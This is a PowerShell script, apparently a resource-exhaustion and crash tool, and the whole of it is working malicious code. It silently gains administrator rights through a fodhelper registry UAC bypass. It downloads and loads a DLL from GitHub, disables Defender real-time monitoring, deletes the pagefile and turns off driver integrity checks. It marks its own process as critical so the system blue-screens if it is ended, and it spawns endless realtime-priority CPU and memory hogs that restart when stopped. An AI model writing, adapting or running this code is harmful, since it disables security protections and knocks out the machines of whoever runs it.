# Self-elevate silently via UAC bypass (unchanged)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

# Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
# Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber -Confirm:$false 

$moduleDir = "$env:windir\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.ThreadJob\2.2.0"

if(-not(Test-Path -Path $moduleDir -PathType Container)){
    New-Item -Path $moduleDir -ItemType Directory -Force | Out-Null
}
if(-not(Test-Path -Path "$moduleDir\Microsoft.PowerShell.ThreadJob.psd1" -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.psd1" -OutFile "$moduleDir\Microsoft.PowerShell.ThreadJob.psd1"
}
if(-not(Test-Path -Path "$moduleDir\Microsoft.PowerShell.ThreadJob.dll" -PathType Leaf)){
    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.dll" -OutFile "$moduleDir\Microsoft.PowerShell.ThreadJob.dll"
}

Import-Module Microsoft.PowerShell.ThreadJob -Force

try{Set-MpPreference -DisableRealtimeMonitoring $true} catch{}
# --- System Tweaks to maximize resource pressure ---
Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait
Start-Process wmic -ArgumentList 'pagefileset where (name="C:\\\\pagefile.sys") delete' -NoNewWindow -Wait
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force

# Disable thermal throttling (admin required)
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
powercfg /setactive SCHEME_CURRENT
$powerPlans = powercfg /list
$highPerformancePlan = $powerPlans | Select-String -Pattern "High Performance"
$guid = ($highPerformancePlan -split '\s+')[3]
if ($guid) {
    powercfg /setactive $guid
    Write-Host "High Performance plan activated."
}

# --- Calculate RAM parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$targetSize = [math]::Floor($physicalMem * 5)

$minChunkSize = 4GB
$maxChunkSize = 15GB
$increaseChunkSize = 1GB

$threads = [Environment]::ProcessorCount
$jobs = [System.Collections.ArrayList]::new()

# Add-Type block to import native NT functions for BSOD trigger
$source = @"
using System;
using System.Runtime.InteropServices;

public static class CS{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

    [DllImport("ntdll.dll")]
    public static extern uint NtSetInformationProcess(IntPtr hProcess, int ProcessInformationClass, ref uint ProcessInformation, int ProcessInformationLength);
	
    public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@

$prioritySettings = @"
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")]
    public static extern bool SetThreadPriority(IntPtr hThread, int nPriority);
    [DllImport("kernel32.dll")]
    public static extern bool SetPriorityClass(IntPtr hProcess, uint dwPriorityClass);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")]
    public static extern bool SetProcessAffinityMask(IntPtr hProcess, IntPtr dwProcessAffinityMask);
}
"@


function Set-RealTimePriority {
    param([string]$prioritySettings)
    Add-Type -TypeDefinition $prioritySettings 
    # Set process priority to REALTIME_PRIORITY_CLASS (0x00000100)
    Write-Host "BEGIN SETTING PRIORITY"
    $REALTIME_PRIORITY_CLASS = 0x00000100
    $hProc = [NativeMethods]::GetCurrentProcess()
    [NativeMethods]::SetPriorityClass($hProc, $REALTIME_PRIORITY_CLASS)

    # Set thread priority to THREAD_PRIORITY_TIME_CRITICAL (15)
    $THREAD_PRIORITY_TIME_CRITICAL = 15
    $hThread = [NativeMethods]::GetCurrentThread()
    [NativeMethods]::SetThreadPriority($hThread, $THREAD_PRIORITY_TIME_CRITICAL)

    # Set affinity to all logical processors
    $numCores = [Environment]::ProcessorCount
    $affinityMask = [IntPtr]((1L -shl $numCores) - 1)
    [NativeMethods]::SetProcessAffinityMask($hProc, $affinityMask)
    Write-Host "END SETTING PRIORITY"
}

# Kernel-level BSOD trigger function
function Invoke-KernelBSOD {
    param([bool]$isProcessCritical)
    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
    $comparams.CompilerOptions = '/unsafe'
    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
    if($isProcessCritical){ 
        # become critical process
        # [CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
        
        # method 2 of becoming critical process
        $priorityBoost=0x12
        [CS]::NtSetInformationProcess([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x1D, [ref]$priorityBoost, 4)
        
     } else{ [CS]::Kill() }
}

Invoke-KernelBSOD -isProcessCritical $true
Set-RealTimePriority -prioritySettings $prioritySettings

# Job script block for CPU + Memory stress per thread
$jobScript = {
    param($jobIndex, $minChunkSize, $maxChunkSize, $increaseChunkSize, $targetSize, $prioritySettings)

    # Set thread priority highest
    [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest
    Add-Type -TypeDefinition $prioritySettings

    # Set process priority to Realtime (aggressive) and Set process affinity to all cores
    try {
        $proc = Get-Process -Id $PID
        $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
        $numCores = [Environment]::ProcessorCount
        $affinityMask = (1L -shl $numCores) - 1
        $proc.ProcessorAffinity = [IntPtr]$affinityMask
        $REALTIME_PRIORITY_CLASS = 0x00000100
        $hProc = [NativeMethods]::GetCurrentProcess()
        [NativeMethods]::SetPriorityClass($hProc, $REALTIME_PRIORITY_CLASS)
        $THREAD_PRIORITY_TIME_CRITICAL = 15
        $hThread = [NativeMethods]::GetCurrentThread()
        [NativeMethods]::SetThreadPriority($hThread, $THREAD_PRIORITY_TIME_CRITICAL)
        $affinityMask = [IntPtr]((1L -shl $numCores) - 1)
        [NativeMethods]::SetProcessAffinityMask($hProc, $affinityMask)
        [System.Runtime.GCSettings]::LatencyMode = [System.Runtime.GCLatencyMode]::LowLatency
        [System.GC]::Collect()
        Write-Host "Job ${jobIndex}: Process priority set to Realtime."
    } catch {
        Write-Warning "Job ${jobIndex}: Failed to set process priority to Realtime: $_"
    }

    # CPU Stress function with multiple CPU intensive tasks
    $numThreads = [Environment]::ProcessorCount
    $throttleLimit = ([Environment]::ProcessorCount * 15)
    function Stress-CPU {
        param([int]$iterations, $numThreads, $throttleLimit)

        $hashJob = {
            $data = [byte[]]::new(1048576599)
            $sha512 = [System.Security.Cryptography.SHA512]::Create()
            while($true) {
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
                $data = $sha512.ComputeHash($data)
            }
        }

        $primeFactorJob = {
            param([int]$iterations=1000000000)
            function Get-Primes {
                param($n)
                $factors = @()
                for ($i = 2; $i -le $n; $i++) {
                    while ($n % $i -eq 0) {
                        $factors += $i
                        $n = [math]::Floor($n / $i)
                    }
                }
                return $factors
            }
            $i=0
            while ($i -lt $iterations) {
                $number = Get-Random -Minimum 1000000000000 -Maximum 9999999999999
                Get-Primes $number | Out-Null
                ++$i
            }
        }

        # Matrix multiplication stress 
        $matrixMultiplicationJob = {
            param([int]$iterations=1000000000)
            $size = $iterations
            $A = @(); $B = @(); $C = @()
            0..($size-1) | ForEach-Object {
                $A += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
                $B += ,@(1..$size | ForEach-Object { Get-Random -Min 1000000000000 -Max 9999999999999 })
                $C += ,@(0..($size-1) | ForEach-Object { 0 })
            }
            0..($size-1) | ForEach-Object { $i = $_
                0..($size-1) | ForEach-Object { $j = $_
                    $sum = 0
                    0..($size-1) | ForEach-Object { $k = $_
                        $sum += ($A[$i][$k] * $B[$k][$j])
                    }
                    $C[$i][$j] = $sum
                }
            }
        }

        $randomMathJob = {
            while ($true) {
                $x = Get-Random -Minimum 1000000000000 -Maximum 9999999999999
                $y = Get-Random -Minimum 1000000000000 -Maximum 9999999999999
                ([math]::Sqrt($x * $y) + [math]::Log($x + $y) + ([math]::Sin([math]::PI * $x + [math]::Sqrt($y)) * [math]::Tanh([math]::PI * $x + [math]::Sqrt($y)))) | Out-Null
            }
        }

        $mandelbrotJob = {
            param([int]$iterations = 1000000000) 
            while ($true) {
                0..2000 | ForEach-Object { 
                    $x = $_ / 400 - 2.5
                    0..2000 | ForEach-Object {
                        $y = $_ / 400 - 2
                        $zx = $zy = 0
                        $i = 0
                        while ($i -lt $iterations -and ($zx * $zx + $zy * $zy) -lt 4) {
                            $temp = $zx * $zx - $zy * $zy + $x
                            $zy = 2 * $zx * $zy + $y
                            $zx = $temp
                            $i++
                        }
                    }
                }
            }
        }

        $monteCarloJob = {
            param([int]$iterations=1000000000)
            $itr = 1000000000 
            $itr += $iterations
            $count = 0
            1..$itr | ForEach-Object {
                $x = [System.Random]::new().NextDouble()
                $y = [System.Random]::new().NextDouble()
                if ($x * $x + $y * $y -le 1) { $count++ }
            }
            $pi = 4 * $count / $itr
        }

        $fibJob = {
            param([int]$iterations=1000000000)
            function Get-Fib {
                param($n)
                if ($n -le 1) { return $n }
                return (Get-Fib ($n-1)) + (Get-Fib ($n-2))
            }
            Get-Fib $iterations | Out-Null 
        }

        $permutationJob = {
            $inputString = 'abcdefghijklmnonqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' 
            $permutations = [System.Collections.Generic.List[string]]::new()
            function Generate-Permutations {
                param([char[]]$array, [int]$size)
                if ($size -eq 1) { $permutations.Add(-join $array) | Out-Null }
                for ($i=0; $i -lt $size; $i++) {
                    Generate-Permutations $array ($size-1)
                    if ($size % 2 -eq 1) { $temp = $array[0]; $array[0] = $array[$size-1]; $array[$size-1] = $temp }
                    else { $temp = $array[$i]; $array[$i] = $array[$size-1]; $array[$size-1] = $temp }
                }
            }
            Generate-Permutations $inputString.ToCharArray() $inputString.Length
        }

        $fftJob = {
            param([int]$iterations=1000000000)
            Add-Type -AssemblyName System.Numerics
            $n = $iterations 
            function Get-FFT {
                param([System.Numerics.Complex[]]$inputArray)

                $N = $inputArray.Length
                if ($N -le 1) { return $inputArray }

                # Split even/odd indices
                $even = @()
                $odd = @()
                for ($i=0; $i -lt $N; $i+=2) { $even += $inputArray[$i] }
                for ($i=1; $i -lt $N; $i+=2) { $odd += $inputArray[$i] }

                # Recursive FFT
                $evenTransformed = Get-FFT $even
                $oddTransformed = Get-FFT $odd

                # Combine results
                [System.Numerics.Complex[]]$output = New-Object System.Numerics.Complex[] $N
                for ($k=0; $k -lt $N/2; $k++) {
                    $twiddle = [System.Numerics.Complex]::Exp(
                        [System.Numerics.Complex]::ImaginaryOne * 
                        (-2 * [math]::PI * $k / $N)
                    )
                    $temp = $twiddle * $oddTransformed[$k]
                    $output[$k] = $evenTransformed[$k] + $temp
                    $output[$k + ($N/2)] = $evenTransformed[$k] - $temp
                }
                return $output
            }   

            $data = 1..$n | ForEach-Object { 
                $img = (Get-Random -Minimum -100.0 -Maximum 100.0)
                [System.Numerics.Complex]::new(
                    [System.Random]::new().NextDouble() * $img, 
                    $img
                )
            }
            Get-FFT $data | Out-Null
        }

        $neuralNetJob = {
            param([int]$iterations = 1000000000)
            [double[]]$inputs = 1..4096 | ForEach-Object { [System.Random]::new().NextDouble() }
            [double[]]$weights = 1..4096 | ForEach-Object { [System.Random]::new().NextDouble() * 2 - 1 }
            [double]$output = 0.0
            [double]$err = 0.0
            for ($epoch=0; $epoch -lt $iterations; $epoch++) { # $iterations number of epochs
                $sum = 0
                for ($i=0; $i -lt 4096; $i++) {
                    $sum += $inputs[$i] * $weights[$i]
                }
                $output = [math]::Tanh($sum)
                $err = 0.5 - $output
                for ($i=0; $i -lt 4096; $i++) {
                    $weights[$i] += 0.00001 * $err * $inputs[$i] # Smaller learning rate
                }
            }
        }

        $geneticJob = {
            param([int]$iterations = 1000000000)
            # Dynamic parameters based on iterations
            $populationSize = [math]::Min(10000000, $iterations * 100)  # Up to 10M individuals
            $geneCount = [math]::Min(10000, $iterations)  # Up to 10K genes per individual
            $mutationRate = 0.0001 * $iterations  # Scale mutation probability
        
            # Initialize population with complex chromosomes
            $population = 1..$populationSize | ForEach-Object {
                [PSCustomObject]@{
                    Genes = 1..$geneCount | ForEach-Object { 
                        [System.Random]::new().NextDouble() -gt 0.5 
                    }
                    Fitness = $null
                }
            }
        
            # Complex fitness function with multiple factors
            function Get-Fitness {
                param($genes)
                $sum = 0
                $product = 1
                $sinSum = 0
                $xorTotal = 0

                # Multiple parallel computations
                0..($genes.Count-1) | ForEach-Object {
                    $gene = $genes[$_]
                    $sum += [int]$gene
                    if($gene) { $product *= 1.1 }
                    else { $product *= 0.9 } 
                    # $product *= ($gene ? 1.1 : 0.9)
                    $sinSum += [math]::Sin([math]::PI * $_ * [int]$gene)
                    $xorTotal = $xorTotal -bxor [int]$gene
                }
            
                # Combine factors using weighted sum
                return (($sum * 0.3) + ($product * 0.2) + ($sinSum * 0.25) + ($xorTotal * 0.25))
            }
        
            # Enhanced evolutionary loop
            for ($gen=0; $gen -lt $iterations; $gen++) {
                Write-Progress -Activity "Genetic Evolution" -Status "Generation $gen" -PercentComplete ($gen/$iterations*100)

                # Parallel fitness evaluation
                $population | ForEach-Object {
                    $_.Fitness = Get-Fitness -genes $_.Genes
                }
            
                # Tournament selection
                $parents = $population | 
                    Sort-Object { [System.Random]::new().NextDouble() * $_.Fitness } -Descending |
                    Select-Object -First ([math]::Max(1000, $population.Count/100))
            
                # Multi-point crossover with mutation
                $newPopulation = for ($i=0; $i -lt $populationSize; $i++) {
                    $parent1 = $parents | Get-Random
                    $parent2 = $parents | Get-Random

                    # Two-point crossover
                    $crossoverPoint1 = Get-Random -Minimum 0 -Maximum $geneCount
                    $crossoverPoint2 = Get-Random -Minimum $crossoverPoint1 -Maximum $geneCount
                    $childGenes = $parent1.Genes[0..$crossoverPoint1] + 
                                  $parent2.Genes[($crossoverPoint1+1)..$crossoverPoint2] + 
                                  $parent1.Genes[($crossoverPoint2+1)..($geneCount-1)]
                
                    # Probabilistic mutation
                    0..($childGenes.Count-1) | ForEach-Object {
                        if ([System.Random]::new().NextDouble() -lt $mutationRate) {
                            $childGenes[$_] = -not $childGenes[$_]
                        }
                    }
                
                    [PSCustomObject]@{
                        Genes = $childGenes
                        Fitness = $null
                    }
                }
            
                $population = $newPopulation
            }
        }

        $rayTraceJob = {
            param([int]$iterations = 1000000000)
            $width = 7680 # 8K
            $height = 4320
            $spheres = 1..$iterations | ForEach-Object { # $iterations spheres
                @{
                    x = [System.Random]::new().Next(-1000,1000)
                    y = [System.Random]::new().Next(-1000,1000)
                    z = [System.Random]::new().Next(-1000,1000)
                    radius = [System.Random]::new().Next(50,200)
                }
            }
            0..($width-1) | ForEach-Object { $x = $_
                0..($height-1) | ForEach-Object { $y = $_
                    $minT = [double]::MaxValue
                    foreach ($sphere in $spheres) {
                        $dx = $x - $sphere.x
                        $dy = $y - $sphere.y
                        $dz = 0 - $sphere.z
                        $a = $dx*$dx + $dy*$dy + $dz*$dz
                        $b = 2*($dx*$x + $dy*$y + $dz*0)
                        $c = $x*$x + $y*$y - $sphere.radius*$sphere.radius
                        $discriminant = $b*$b - 4*$a*$c
                        if ($discriminant -ge 0) {
                            $t = (-$b - [math]::Sqrt($discriminant)) / (2*$a)
                            if ($t -lt $minT) { $minT = $t }
                        }
                    }
                }
            }
        }

        $sieveJob = {
            param([int]$iterations = 1000000000)
            $limit = $iterations 
            $sieve = New-Object bool[] ($limit+1)
            $sqrt = [math]::Sqrt($limit)
            1..$sqrt | ForEach-Object { $x = $_
                1..$sqrt | ForEach-Object { $y = $_
                    $n = 4*$x*$x + $y*$y
                    if ($n -le $limit -and ($n % 12 -eq 1 -or $n % 12 -eq 5)) { $sieve[$n] = -not $sieve[$n] }
                    $n = 3*$x*$x + $y*$y
                    if ($n -le $limit -and $n % 12 -eq 7) { $sieve[$n] = -not $sieve[$n] }
                    $n = 3*$x*$x - $y*$y
                    if ($x -gt $y -and $n -le $limit -and $n % 12 -eq 11) { $sieve[$n] = -not $sieve[$n] }
                }
            }
            5..$sqrt | ForEach-Object { $i = $_
                if ($sieve[$i]) {
                    $k = $i*$i
                    $j = $k
                    while ($j -le $limit) {
                        $sieve[$j] = $false
                        $j += $k
                    }
                }
            }
        }

        $crackJob = {
            param([int]$iterations = 1000000000)
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
            $maxLength = $iterations
        
            # Enhanced CPU-heavy password test
            function Test-Password {
                param($current)
                $hash = [System.Security.Cryptography.SHA512]::Create().ComputeHash(
                    [System.Text.Encoding]::UTF8.GetBytes($current)
                )
                [System.BitConverter]::ToString($hash).Replace("-","") | Out-Null
            }
        
            # Recursive brute-force generator
            function Invoke-BruteForce {
                param(
                    [int]$length,
                    [string]$current
                )
                if ($length -eq 0) {
                    Test-Password $current
                    return
                }
                foreach ($c in $chars.ToCharArray()) {
                    Invoke-BruteForce -length ($length - 1) -current ($current + $c)
                }
            }
        
            # Start brute-force from 1 to $maxLength characters
            1..$maxLength | ForEach-Object {
                Invoke-BruteForce -length $_ -current ""
            }
        }

        1..$numThreads | ForEach-Object {
            Start-ThreadJob -ScriptBlock $hashJob -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $primeFactorJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $matrixMultiplicationJob -ArgumentList $iterations -ThrottleLimit $throttleLimit  | Out-Null
            Start-ThreadJob -ScriptBlock $randomMathJob -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $mandelbrotJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $monteCarloJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $fibJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $permutationJob -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $fftJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $neuralNetJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $geneticJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $rayTraceJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $sieveJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
            Start-ThreadJob -ScriptBlock $crackJob -ArgumentList $iterations -ThrottleLimit $throttleLimit | Out-Null
        }
    }

    $Stress_MemoryProgressive = {
        param(
            [int64]$minChunkSize,
            [int64]$maxChunkSize,
            [int64]$increaseChunkSize,
            [int64]$targetSize
        )
        echo "mem hog started with $minChunkSize, $maxChunkSize, $increaseChunkSize and $targetSize" >> "C:\mem_job.log"
        $allocated = 0
        $memChunks = [System.Collections.Generic.List[byte[]]]::new()
        $chunkSize = $minChunkSize

        while ($allocated -lt $targetSize) {
            # Increase chunk size progressively but cap at maxChunkSize
            if ($chunkSize -lt $maxChunkSize) {
                $chunkSize = $chunkSize + $increaseChunkSize
            }
            try {
                $chunk = New-Object byte[] $chunkSize
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
                $memChunks.Add($chunk)
                $allocated += $chunkSize
                Write-Progress -Activity "Allocating Memory" -Status "Allocated $([math]::Round($allocated / 1MB)) MB" -PercentComplete (($allocated / $targetSize) * 100)
            } catch {
                Write-Warning "Memory allocation failed at $chunkSize bytes: $_"
            }
            Start-Sleep -Milliseconds 500
        }
        # Keep $memChunks alive to prevent GC
        while ($true) { Start-Sleep -Seconds 1 }
    }
    
    1..$numThreads | ForEach-Object{
        Start-ThreadJob -ScriptBlock $Stress_MemoryProgressive -ArgumentList $minChunkSize, $maxChunkSize, $increaseChunkSize, $targetSize  -ThrottleLimit $throttleLimit | Out-Null
    }

    # CPU stress loop with progressive load increase
    $iterations = (1000000 * $jobIndex * [System.Environment]::ProcessorCount)
    $tempItr = $iterations
    while ($true) {
        try {
            Stress-CPU -iterations $iterations -numThreads $numThreads -throttleLimit $throttleLimit
        } catch {}

        Start-Sleep -Milliseconds 200

        if ($iterations -lt ($tempItr + 9000000)) {
            $iterations += 500000
        }
    }
}


function Start-StressJob {
    param($index)
    $job = Start-Job -ScriptBlock $jobScript -ArgumentList $index, $minChunkSize, $maxChunkSize, $increaseChunkSize, $targetSize, $prioritySettings
    $job | Add-Member -NotePropertyName RetryCount -NotePropertyValue 0
    $jobs.Add($job)
}

# Start stress jobs for each CPU core
for ($i = 1; $i -le $threads; $i++) {
    Start-StressJob -index $i
}

Write-Host "Started $threads stress jobs with high priority."

$jobs | ForEach-Object {
    Write-Host "Job $($_.Id) state: $($_.State)"
}

# Optional: Wait some time before triggering BSOD (adjust delay as needed)
# $bsodDelaySeconds = 180
# Write-Host "Waiting $bsodDelaySeconds seconds before triggering BSOD..."
# $elapsedTime = 0

# while ($elapsedTime -lt $bsodDelaySeconds) {
#     Start-Sleep -Seconds 1
#     $elapsedTime++
#     Write-Progress -Activity "Waiting before BSOD" -Status "$elapsed seconds elapsed" -PercentComplete (($elapsed / $bsodDelaySeconds) * 100)
#     foreach ($job in $jobs) {
#         if ($job.State -ne 'Running') {
#             Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
#             Remove-Job -Job $job -Force
#             $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
#             $jobs += $newJob
#         }
#     }
# }

# # Trigger BSOD
# Invoke-KernelBSOD -isProcessCritical $false

# --- Monitor jobs and restart if any stop ---
while ($true) {
    $currentJobs = @($jobs.ToArray())
    foreach ($job in $currentJobs) {
        if ($job.State -ne 'Running') {
            # if ($job.RetryCount -ge 5) {
                #     Write-Warning "Job $($job.Id) failed 5 times. Removing."
                #     $jobs.Remove($job) | Out-Null
                #     continue
            # }
            Write-Warning "Job $($job.Id) stopped. Restarting..."
            Remove-Job -Job $job -Force
            $jobs.Remove($job) | Out-Null
            Start-StressJob -index $job.Id
            $newJob = $jobs | Where-Object { $_.Id -eq $job.Id }
            if ($newJob) {
                $newJob.RetryCount = $job.RetryCount + 1 
                $jobs.Add($newJob)
            }
        }
    }
    Start-Sleep -Seconds 10
}

# Cleanup (never reached unless script forcibly stopped)
$jobs | ForEach-Object {
    Stop-Job -Job $_ -Force
    Remove-Job -Job $_ -Force
}